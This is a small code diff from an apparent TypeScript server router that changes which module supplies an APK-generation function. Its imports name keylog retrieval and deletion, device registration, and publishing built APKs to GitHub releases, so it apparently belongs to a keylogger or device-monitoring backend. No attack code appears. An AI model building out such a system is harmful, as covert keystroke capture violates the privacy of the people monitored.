@@ -10,7 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl } from './db';
 import { sdk } from "./_core/sdk";
-import { generateRealAPK } from "./apk-generator";
+import { generateRealAPK } from "./apk-generator-simple";
 import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
 
 export const appRouter = router({
